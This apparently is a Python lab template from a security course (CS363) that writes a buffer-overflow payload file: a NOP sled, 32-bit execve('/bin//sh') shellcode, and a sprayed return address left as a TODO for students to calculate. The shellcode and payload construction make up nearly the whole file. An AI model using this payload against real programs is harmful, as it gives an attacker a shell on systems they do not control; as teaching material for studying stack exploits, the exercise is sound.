##!/usr/bin/python3
import sys

# Based on CS363 lecture (Section 4.6.2 & 4.6.3)
# Challenge 2: Unknown Buffer Size AND Address
# We know minimal address A = 0xffffcd8c
# We know Address Range H = 100 bytes
# We know Spray Section S = 120 bytes
# We know NOP Sled L = 180 bytes

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# 1. Define payload sections
payload_size = 300
spray_section_S = 120
nop_sled_L = payload_size - spray_section_S # 180 bytes

# Create a NOP-filled array
content = bytearray(0x90 for i in range(payload_size))

# 2. Put shellcode at the very end
start_shellcode = payload_size - len(shellcode)
content[start_shellcode:] = shellcode

# 3. Calculate the "Safe" Return Address (RT)
#
# We need to find the "conjunction" or "safe zone"
# Safe Zone = [ (A + H) + S , A + S + L ]
#
# Check H < L: 100 < 180. We are good!
#
# Let's pick the *start* of the safe zone for our RT.
# RT = (A + H) + S
#
A = 0xffffcd8c
H = 100
S = 120
#
# TODO: CALCULATE THE 'ret' VALUE BASED ON THE FORMULA
ret = 0x00000000 
#
#
ret_bytes = (ret).to_bytes(4, byteorder='little')

# 4. "Spray" the RT over the entire Spray Section (S)
# (This part is done for you, as it's the same as Challenge 1)
for i in range(0, spray_section_S, 4):
    content[i:i+4] = ret_bytes

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

print(f"badfile created with 'Safe Zone' RT = {hex(ret)}")
